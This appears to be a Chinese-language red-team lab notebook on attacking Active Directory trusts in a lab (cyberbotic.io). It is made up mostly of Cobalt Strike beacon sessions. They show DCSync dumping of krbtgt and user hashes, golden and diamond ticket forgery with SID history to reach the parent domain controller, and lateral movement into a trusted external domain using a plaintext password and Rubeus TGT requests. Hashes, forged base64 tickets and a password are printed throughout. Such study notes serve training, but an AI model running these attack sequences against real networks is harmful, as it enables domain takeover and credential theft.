# Parent/Child

枚举域信任关系

```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 24 bytes
[*] You are DEV\bfarmer
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[+] host called home, sent: 145560 bytes
beacon> powershell Get-DomainTrust
[*] Tasked beacon to run: Get-DomainTrust
[+] host called home, sent: 313 bytes
[+] received output:
#< CLIXML

[+] received output:


SourceName      : dev.cyberbotic.io
TargetName      : cyberbotic.io
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 8/7/2022 1:05:44 AM

SourceName      : dev.cyberbotic.io
TargetName      : subsidiary.external
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : 
TrustDirection  : Inbound
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 8/7/2022 1:06:03 AM

```


子域 dev.cyberbotic.io对父域cyberbotic.io有双向信任关系（Bidirectional）

制作金票访问

首先要知道krbtgt的哈希

```
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[*] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:dev.cyberbotic.io /user:DEV\krbtgt command
[+] host called home, sent: 297586 bytes
[+] received output:
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 2/19/2021 1:31:57 PM
Object Security ID   : S-1-5-21-3263068140-2042698922-2891547269-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 833ef1dcc490f88a8f4a8a00859736de
    ntlm- 0: 833ef1dcc490f88a8f4a8a00859736de
    lm  - 0: b22a486933e82eb32723ebde745d18f4

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : ab6cf712f4b01301770b3b4a96803ac9

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa
      aes128_hmac       (4096) : 473a92cc46d09d3f9984157f7dbc7822
      des_cbc_md5       (4096) : b9fefed6da865732

* Primary:Kerberos *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Credentials
      des_cbc_md5       : b9fefed6da865732

* Packages *
    NTLM-Strong-NTOWF
```

枚举父域的DA组的SID
```
beacon> powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
[*] Tasked beacon to run: Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
[+] host called home, sent: 497 bytes
[+] received output:
#< CLIXML

objectsid                                   
---------                                   
S-1-5-21-378720957-2217973887-3501892633-512
```


枚举父域DC名字

```
beacon> powershell Get-DomainController -Domain cyberbotic.io | select Name
[*] Tasked beacon to run: Get-DomainController -Domain cyberbotic.io | select Name
[+] host called home, sent: 421 bytes
[+] received output:
#< CLIXML

Name              
----              
dc-1.cyberbotic.io
```

## 金票

```
kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /startoffset:-10 /endin:600 /renewmax:10080 /ticket:cyberbotic.kirbi
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661127998995.png)

导入金票访问
```
beacon> make_token CYBER\Administrator FakePass
[*] Tasked beacon to create a token for CYBER\Administrator
[+] host called home, sent: 46 bytes
[+] Impersonated DEV\bfarmer
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\cyberbotic.kirbi
[*] Tasked beacon to apply ticket in C:\Users\Administrator\Desktop\cyberbotic.kirbi
[+] host called home, sent: 3049 bytes
beacon> ls \\dc-1\c$
[*] Tasked beacon to list files in \\dc-1\c$
[+] host called home, sent: 27 bytes
[*] Listing: \\dc-1\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 09:22:26   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/25/2022 11:20:17   inetpub
          dir     02/23/2018 11:06:05   PerfLogs
          dir     08/21/2022 10:22:29   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/25/2022 12:10:08   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     01/20/2022 15:50:53   Shares
          dir     02/19/2021 10:18:17   System Volume Information
          dir     05/15/2021 16:48:31   Users
          dir     08/21/2022 10:13:50   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 512mb    fil     08/22/2022 00:06:58   pagefile.sys
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661128044045.png)

## 钻票

请求tgt

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
[+] host called home, sent: 585669 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 

[*] Action: Diamond Ticket

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/dc-2.dev.cyberbotic.io'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: Jv20RufkHst0H3cnOpCmY3SyBm3vAFxsMp1MPHpyzBs=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIErzCCBKugAwIBBaEDAgEWooIDoDCCA5xhggOYMIIDlKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA04wggNKoAMCARKhAwIBAqKCAzwEggM4oVinLCwTZzDMMCggeoW5QKOfW59mo6i8s+P5rxhJ2I/XzT4B9mYv6Y97TILRyyGHroS6/oY1Ba2eHxGXksbwfs8/ZEl6kFmwlHpvsozfh+TUYufOkLLtvXvSDefV26sC49IxSXM7fIMb3ZGvoRj/Z5cE4U7LbcEI6hz47lZdi8KkwCyUmj61SMWamvPS/1ZoaGYX9EkXLbv38MVItqT5422wR8tmd1wI+KyEhGQsCpYGuBsfhD/0S6UPIZmM32TBo3Uti5Cwcx5Wwxs88c3PwTy4/rNahvSbVzM+jIWHHrubFsCkvWlyuzSnSVtQL6T61kW/Rd0SnBs2hlacTnCT3a6G35/JBgcDUM2q3U6l1+AQa4H3wWcsl0i9SxrkEdiBQO42Nxq606gRM6uEVYeWtrV/RtzE1eN6b4342tee+Jiyyd01yc0x/fy4nyXrE3JSOkap6JjDWwlkCCpxvYbXiCEXZfD0MAafLbJAtemy/VXxSf70LLYmyhMUjCeZGf+myyBt584VmanC5kfbTqNoMe9yh+zauCLuj0ccaVHNhuZu1DKhsVdwKuEAAs0F9Sqfzy9lgxYVQsgL/MBc1fcbwJMNud7ZbD19SeO4KEbylin8eHrempfRZ9d3eBLxu6fvQRJdaN9XaxePYrEVuQ56jwFAycHGwVZ+KZRHtBABOhAkliivaS0PVtWqUv2csSyJ97t6MmGNaDt9CazOYXv0qrnJ6kwsm9noDzTVxhRWJ5uQyjbIWxb2r5VcDRvS9+lj1p0sOhKBjvNiZoGIq3AxPbSv1xJFUE0PugpdZr4pSQW0NGst1wwx+LSroINwBDiNMXf+Ao1h+0o+bvc+Rxoo0XlghjSahtf3cjSKjMd6YfWATOlcdwM5fNM0SlV26erFYupOkgv8JDAA+lE1xayTAGkEaP68cagzrZmd5r9y9g3d+CRn6zQmthLAiHZrfeTX5D2AGSH16bTS5fG8JoJc7OeMbzPebP3P3B9WJT/cehwSSWe9s3DG2lsW1RnPXBjJZfIkIc8uu+2fN3QATMXmTjw7GcFkFgqX8FlLQtaLC9RXuwJ5pfbiVhVH01TDM3OetU7B9ODWMXOjgfowgfegAwIBAKKB7wSB7H2B6TCB5qCB4zCB4DCB3aArMCmgAwIBEqEiBCA/EgUe14UNfhtgzl7gRO/KBIrBqxCqLRFjp6rLWxv9HKETGxFkZXYuY3liZXJib3RpYy5pb6IaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAGAhAAClERgPMjAyMjA4MjIwMDI5MjFaphEYDzIwMjIwODIyMTAxODQxWqcRGA8xOTcwMDEwMTAwMDAwMFqoExsRZGV2LmN5YmVyYm90aWMuaW+pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEURFVi5DWUJFUkJPVElDLklP

[*] Decrypting TGT
[*] Retreiving PAC
[*] Modifying PAC
[*] Signing PAC
[*] Encrypting Modified TGT

[*] base64(ticket.kirbi):

      doIEojCCBJ6gAwIBBaEDAgEWooIDkzCCA49hggOLMIIDh6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA0EwggM9oAMCARKhAwIBA6KCAy8EggMr7E/bynxRDyk/uWoWu6RqXOys8nuqAmIECAKSVUQ6h/4m1O2FfLq5RswHXrjw76P+s6kvHBKHOBddZkEzIiXZbT6jAySNw/EKjfvPPFaeK1Ag8iJsiqqyxIaiHIwdreWpzm/LgrTTxIUD3gPh0QtFqi2h8/qvr2HxDhGm3Zvr7WwLfn+JPtccbTGSiGCBDPJq50rdu7dFCTvBlFTYNEA0udLRohqapFnztALmHEeVvx97+Xt3yjyqirrAy38n4JNWXcp1uUlnxoiZkSIf8JzgI9a9rbDm0J9+PcYrmSZvs7zYradrpobPUBTSQTE2Bq4/mq5L7AT1cvCWXWFtlpBB95I+Yy5cJTD76+sEkoIt8Hbgv2AnkjvHm9N3jL7IZB9yl47lDefQn7EV1Uy6/JGkGJSemhvPosfcS+aXOpkz+vJlwaEiDEdaFBYYfxjEPeJ03dapXF8ocnhl8MN1HjrBQN8TaD4rdM9KXCyog4b9Kij52fh/AAUKhVRKg3KistHEw6y8W4YWS4TfWg/30Sq2ccMtG5E3HknbudsB033UdjxYUM6lf5FFo/6AE5dTnhp8gVZU55+c7aXPN2bBkxg4GZs2AKAmbF/i2z3jSZzpdzLpjoDzV8Cr/a29kQDmSIIUIZIb/hWXKbiyVKirhwasHJ0YchpgXdvOZUCe++TYgcXEidFJafSASRczs+QCumJBRiDcb3uJmsKeEGafG5tMRRFk4cm/Gj0l74mQq3tyCg8+EwITJNIgQRNNsMfSHHlbL2Vu5dkuy+WLBUs1K6hwADTfr88ItKPupuZIHcIszV7I8sstQ0AEIttcub9Z/ABqiS0kSOCXegaCU3HeAq76E3J3wYHkCeN81IHsaZhBKWDbIfXZ4L8rwbh0/0lO79ZbPuLXQEWbc/MRNT2Jwj9Yo028zbLNWa+zWqF0cVRNVwLezYGs4dbEajHeSOKjfWamCvIWJiX7GXRGCmqCGUKCj0JBxPC42LF8qUGDtEaftHUKF+W73tI/5UUtLl7O2dou2Ufpt3tfqJ7OYNSuhs2ObcfuSoddWLvyQKGTIaWXN6C619umskmUJ3FNhKOB+jCB96ADAgEAooHvBIHsfYHpMIHmoIHjMIHgMIHdoCswKaADAgESoSIEID8SBR7XhQ1+G2DOXuBE78oEisGrEKotEWOnqstbG/0coRMbEWRldi5jeWJlcmJvdGljLmlvohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAYCEAAKURGA8yMDIyMDgyMjAwMjkyMVqmERgPMjAyMjA4MjIxMDE4NDFapxEYDzE5NzAwMTAxMDAwMDAwWqgTGxFkZXYuY3liZXJib3RpYy5pb6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8=



```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661128624021.png)



制作tgt文件
```
[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\Administrator.kirbi", [Convert]::FromBase64String("doIEojCCBJ6gAwIBBaEDAgEWooIDkzCCA49hggOLMIIDh6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA0EwggM9oAMCARKhAwIBA6KCAy8EggMr7E/bynxRDyk/uWoWu6RqXOys8nuqAmIECAKSVUQ6h/4m1O2FfLq5RswHXrjw76P+s6kvHBKHOBddZkEzIiXZbT6jAySNw/EKjfvPPFaeK1Ag8iJsiqqyxIaiHIwdreWpzm/LgrTTxIUD3gPh0QtFqi2h8/qvr2HxDhGm3Zvr7WwLfn+JPtccbTGSiGCBDPJq50rdu7dFCTvBlFTYNEA0udLRohqapFnztALmHEeVvx97+Xt3yjyqirrAy38n4JNWXcp1uUlnxoiZkSIf8JzgI9a9rbDm0J9+PcYrmSZvs7zYradrpobPUBTSQTE2Bq4/mq5L7AT1cvCWXWFtlpBB95I+Yy5cJTD76+sEkoIt8Hbgv2AnkjvHm9N3jL7IZB9yl47lDefQn7EV1Uy6/JGkGJSemhvPosfcS+aXOpkz+vJlwaEiDEdaFBYYfxjEPeJ03dapXF8ocnhl8MN1HjrBQN8TaD4rdM9KXCyog4b9Kij52fh/AAUKhVRKg3KistHEw6y8W4YWS4TfWg/30Sq2ccMtG5E3HknbudsB033UdjxYUM6lf5FFo/6AE5dTnhp8gVZU55+c7aXPN2bBkxg4GZs2AKAmbF/i2z3jSZzpdzLpjoDzV8Cr/a29kQDmSIIUIZIb/hWXKbiyVKirhwasHJ0YchpgXdvOZUCe++TYgcXEidFJafSASRczs+QCumJBRiDcb3uJmsKeEGafG5tMRRFk4cm/Gj0l74mQq3tyCg8+EwITJNIgQRNNsMfSHHlbL2Vu5dkuy+WLBUs1K6hwADTfr88ItKPupuZIHcIszV7I8sstQ0AEIttcub9Z/ABqiS0kSOCXegaCU3HeAq76E3J3wYHkCeN81IHsaZhBKWDbIfXZ4L8rwbh0/0lO79ZbPuLXQEWbc/MRNT2Jwj9Yo028zbLNWa+zWqF0cVRNVwLezYGs4dbEajHeSOKjfWamCvIWJiX7GXRGCmqCGUKCj0JBxPC42LF8qUGDtEaftHUKF+W73tI/5UUtLl7O2dou2Ufpt3tfqJ7OYNSuhs2ObcfuSoddWLvyQKGTIaWXN6C619umskmUJ3FNhKOB+jCB96ADAgEAooHvBIHsfYHpMIHmoIHjMIHgMIHdoCswKaADAgESoSIEID8SBR7XhQ1+G2DOXuBE78oEisGrEKotEWOnqstbG/0coRMbEWRldi5jeWJlcmJvdGljLmlvohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAYCEAAKURGA8yMDIyMDgyMjAwMjkyMVqmERgPMjAyMjA4MjIxMDE4NDFapxEYDzE5NzAwMTAxMDAwMDAwWqgTGxFkZXYuY3liZXJib3RpYy5pb6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8="))
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661128651094.png)

导入票据，访问父域DC
```
beacon> make_token CYBER\Administrator FakePass
[*] Tasked beacon to create a token for CYBER\Administrator
[+] host called home, sent: 46 bytes
[+] Impersonated DEV\bfarmer
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\Administrator.kirbi
[*] Tasked beacon to apply ticket in C:\Users\Administrator\Desktop\Administrator.kirbi
[+] host called home, sent: 2752 bytes
beacon> ls \\dc-1\c$
[*] Tasked beacon to list files in \\dc-1\c$
[+] host called home, sent: 27 bytes
[*] Listing: \\dc-1\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 09:22:26   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/25/2022 11:20:17   inetpub
          dir     02/23/2018 11:06:05   PerfLogs
          dir     08/21/2022 10:22:29   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/25/2022 12:10:08   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     01/20/2022 15:50:53   Shares
          dir     02/19/2021 10:18:17   System Volume Information
          dir     05/15/2021 16:48:31   Users
          dir     08/21/2022 10:13:50   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 512mb    fil     08/22/2022 00:06:58   pagefile.sys
```



![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661128686688.png)


# One-Way (Inbound)

对subsidiary.external有入站信任


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661129314833.png)

根据入站信任可以枚举外域的域信息，返回外域的DC
```
beacon> powershell Get-DomainComputer -Domain subsidiary.external -Properties DNSHostName
[*] Tasked beacon to run: Get-DomainComputer -Domain subsidiary.external -Properties DNSHostName
[+] host called home, sent: 457 bytes
[+] received output:
#< CLIXML

dnshostname           
-----------           
ad.subsidiary.external

```


下面查询返回外域关联的组合组成员信息

```
beacon> powershell Get-DomainForeignGroupMember -Domain subsidiary.external
[*] Tasked beacon to run: Get-DomainForeignGroupMember -Domain subsidiary.external
[+] host called home, sent: 421 bytes
[+] received output:
#< CLIXML


GroupDomain             : subsidiary.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=subsidiary,DC=external
MemberDomain            : subsidiary.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=subsidiary,
                          DC=external

beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
[*] Tasked beacon to run: ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
[+] host called home, sent: 433 bytes
[+] received output:
#< CLIXML
DEV\Subsidiary Admins

```



![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661129573253.png)

```Get-NetLocalGroupMember```可以枚举机器的本地组成员。这表明它```DEV\Subsidiary Admins```是域控制器上本地管理员组的成员。

```
beacon> powershell Get-NetLocalGroupMember -ComputerName ad.subsidiary.external
[*] Tasked beacon to run: Get-NetLocalGroupMember -ComputerName ad.subsidiary.external
[+] host called home, sent: 429 bytes
[+] received output:
#< CLIXML


ComputerName : ad.subsidiary.external
GroupName    : Administrators
MemberName   : SUBSIDIARY\Administrator
SID          : S-1-5-21-2460913729-3421472287-1760394537-500
IsGroup      : False
IsDomain     : False

ComputerName : ad.subsidiary.external
GroupName    : Administrators
MemberName   : SUBSIDIARY\Enterprise Admins
SID          : S-1-5-21-2460913729-3421472287-1760394537-519
IsGroup      : True
IsDomain     : False

ComputerName : ad.subsidiary.external
GroupName    : Administrators
MemberName   : SUBSIDIARY\Domain Admins
SID          : S-1-5-21-2460913729-3421472287-1760394537-512
IsGroup      : True
IsDomain     : False

ComputerName : ad.subsidiary.external
GroupName    : Administrators
MemberName   : DEV\Subsidiary Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

ComputerName : ad.subsidiary.external
GroupName    : Administrators
MemberName   : SUBSIDIARY\testadmin
SID          : S-1-5-21-2460913729-3421472287-1760394537-1113
IsGroup      : False
IsDomain     : False


```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661129702198.png)


枚举成员Subsidiary Admins的组成员

```
beacon> powershell Get-DomainGroupMember -Identity "Subsidiary Admins" | select MemberName
[*] Tasked beacon to run: Get-DomainGroupMember -Identity "Subsidiary Admins" | select MemberName
[+] host called home, sent: 461 bytes
[+] received output:
#< CLIXML

MemberName
----------
jadams
```



## 利用明文密码
jadams是本域成员，同时也是外域的管理组成员，假设现在有了jadams的明文密码，最简单的访问访问是make_token

明文密码：```N3wPassw0rd!```
```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are DEV\bfarmer
beacon> ls \\ad.subsidiary.external\c$
[*] Tasked beacon to list files in \\ad.subsidiary.external\c$
[+] host called home, sent: 45 bytes
[-] could not open \\ad.subsidiary.external\c$\*: 5
beacon> make_token DEV\jadams N3wPassw0rd!
[*] Tasked beacon to create a token for DEV\jadams
[+] host called home, sent: 41 bytes
[+] Impersonated DEV\bfarmer
beacon> ls \\ad.subsidiary.external\c$
[*] Tasked beacon to list files in \\ad.subsidiary.external\c$
[+] host called home, sent: 45 bytes
[*] Listing: \\ad.subsidiary.external\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     01/20/2022 15:11:33   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     09/09/2021 13:41:54   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/19/2021 22:51:50   System Volume Information
          dir     05/16/2021 11:58:30   Users
          dir     05/16/2021 11:31:57   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 448mb    fil     08/22/2022 22:57:03   pagefile.sys
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661211307021.png)

## 利用哈希

拿到jadams的哈希
```
mimikatz # lsadump::dcsync /domain:dev.cyberbotic.io /user:jadams
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'jadams' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Joyce Adams

** SAM ACCOUNT **

SAM Username         : jadams
User Principal Name  : jadams@dev.cyberbotic.io
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 1/1/1601 12:00:00 AM
Password last change : 8/17/2022 11:16:51 PM
Object Security ID   : S-1-5-21-3263068140-2042698922-2891547269-1121
Object Relative ID   : 1121

Credentials:
  Hash NTLM: 126502da14a98b58f2c319b81b3a49cb
    ntlm- 0: 126502da14a98b58f2c319b81b3a49cb
    ntlm- 1: fde0e9c401de76ae603d140fcdb3b9da
    lm  - 0: 3e7b1589ac77b42e2104b9316947c2e5
    lm  - 1: 1e77387fbbfb87f98b5b88650dd7a4d8

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : be63c5cf815ed8771d1187522bec4e2a

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOjadams
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 178aaea34e7c37d77fde27e2da34e6311bd0ac609c871b925a53bdc69e832a52
      aes128_hmac       (4096) : 69cb6f53741fa3923476068026ca8407
      des_cbc_md5       (4096) : 64730b7cd6fe5b7a
    OldCredentials
      aes256_hmac       (4096) : 70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80
      aes128_hmac       (4096) : ba49116dbf4a12b9041ef5569ba3e699
      des_cbc_md5       (4096) : 20b6f2257a525dda

* Primary:Kerberos *
    Default Salt : DEV.CYBERBOTIC.IOjadams
    Credentials
      des_cbc_md5       : 64730b7cd6fe5b7a
    OldCredentials
      des_cbc_md5       : 20b6f2257a525dda

* Packages *
    NTLM-Strong-NTOWF
```

1. 为jadams这个用户请求tgt
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jadams /domain:dev.cyberbotic.io /aes256:178aaea34e7c37d77fde27e2da34e6311bd0ac609c871b925a53bdc69e832a52 /opsec /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe asktgt /user:jadams /domain:dev.cyberbotic.io /aes256:178aaea34e7c37d77fde27e2da34e6311bd0ac609c871b925a53bdc69e832a52 /opsec /nowrap
[+] host called home, sent: 585525 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 

[*] Action: Ask TGT

[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[!] Pre-Authentication required!
[!] AES256 Salt: DEV.CYBERBOTIC.IOjadams
[*] Using aes256_cts_hmac_sha1 hash: 178aaea34e7c37d77fde27e2da34e6311bd0ac609c871b925a53bdc69e832a52
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\jadams'
[*] Using domain controller: 10.10.17.71:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFhDCCBYCgAwIBBaEDAgEWooIEfDCCBHhhggR0MIIEcKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBCowggQmoAMCARKhAwIBAqKCBBgEggQUVUFOGvGywsjokY5L5rMvgJlcJp9EEddmfVeSB7VM8YVqQSYKcZ5TeDB/CxS2gqpjes2JLuOIKA2A9ZSczJDbH261g9jHom8gsrRcVcvQXj/rvYuS8QBibq/oyTWl0xYPwvGEbCYbi8Rr7oF96ccamTgsQ+bs11VreJyywZNxUxFVLvlncYsscOJ8yFkg1ib9sDApMI5V5VX6+L3y2WI3HlQqYUbWl41KJo8I42qyPrDJzcogaOZSoGqPhdpA88IMY/pB8G+hDS7k6Et5YTNjChoTNXMugjg9YSz68jN3VzJ2epqax1Cyblgki04D4cClSEsH75VzLfarPx7RmaZl94EgwVphEP4eJzabJtDreiclbVxEO4f1e0mAOOK2p6cTjIpa706rgIdhcx3EMNPuatrdLYV0I0DTESoMk7Cx39Tyvc2NVf6SMgV8C37VXdP9FskpuZO0eiNqPPOp3nSzaYUr3vEJE+Y3jCxopVmvat+XwNgPBmgdP5mm3fOs4CQpcEmZKmRLIxXvU5wf9e8mia9ROUnwZtNmfDpI6D99CqBivGSaeatGgJ21m5GBIj6ltOUMHlGJNfQcUB4kub8oE7/y8wMWxXyInsgviGlMZnE9+GYcajLqAv8DkH644kx/cT7b9m5P9UBft0Ak7mbg9xxjINXtFHJTo4DbxZJyojegvBhmE+bAe4BKLh528JkUq1nREb16V4FliFkX+eqKpuTXPiEJkvVxjJN6uKgRNNtQz3cXqzVJJFl8+Jc7IXgxuvrFFVv7ltyaQHGh4tZGmLEJ595H6SEIJ7tZNLtnzMMZCU0bTZXgJQ2hJhifvglc5FbLRnOAqlD2z6M5St0QBZde0aKKMKWLNVYr6f46K0Rd2iR9FnIolE+vXHtYPK6GhqbnvkETlC3qApBqqfUJNJ9xo9LxhTOZlc9NCO+dIq07R1St38vtG3GDY0O/VXg7QSBg+ToS3hHwp9fajmfNVrhQ5KajlkaII7kQYFPQf5L8RmQ0pzzn33defCfXfu1m0r1whTpWSBpr3Iw8eUTq0FOHgN+bSgGj277tK6XUPPlX9EeL8WWS7oeAVo3DPORq4jzYEuo8ohy9aHnpozeX/u75VA+gNAacIFQgkjeaHUBuxJhz6TvhdS65DhtdbqBiY18b0aEjfvrDpw9wub+1tJk5SFo3ecVgMAR++W5KTZ3Ue0tqMZ2KajJXXX9Pf4P+7178Pz1DhkggZ3Ke4va4MmKqNpcrYWCzO+0LdnTu3u4kR/V/m8mGezr85Nqi+cLnpb+CpWh0Xw6PoiX1Eq/RfY4Crsj/UaM/AmgLRVaJ8W/iDDPSYy7eMRUPpkPOjT340AhJRHyITjbr0gy+JjsUQoSB9hThRUfdPHDvybJvwEaqdD7go4HzMIHwoAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagKzApoAMCARKhIgQg/tPpyrs++wA7Z7WPwmpbuBKh8GKl/izyITU0Um5BBo6hExsRREVWLkNZQkVSQk9USUMuSU+iEzARoAMCAQGhCjAIGwZqYWRhbXOjBwMFAEDhAAClERgPMjAyMjA4MzEwMDMzMjJaphEYDzIwMjIwODMxMTAzMzIyWqcRGA8yMDIyMDkwNzAwMzMyMlqoExsRREVWLkNZQkVSQk9USUMuSU+pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEURFVi5DWUJFUkJPVElDLklP

  ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  jadams
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  8/31/2022 12:33:22 AM
  EndTime                  :  8/31/2022 10:33:22 AM
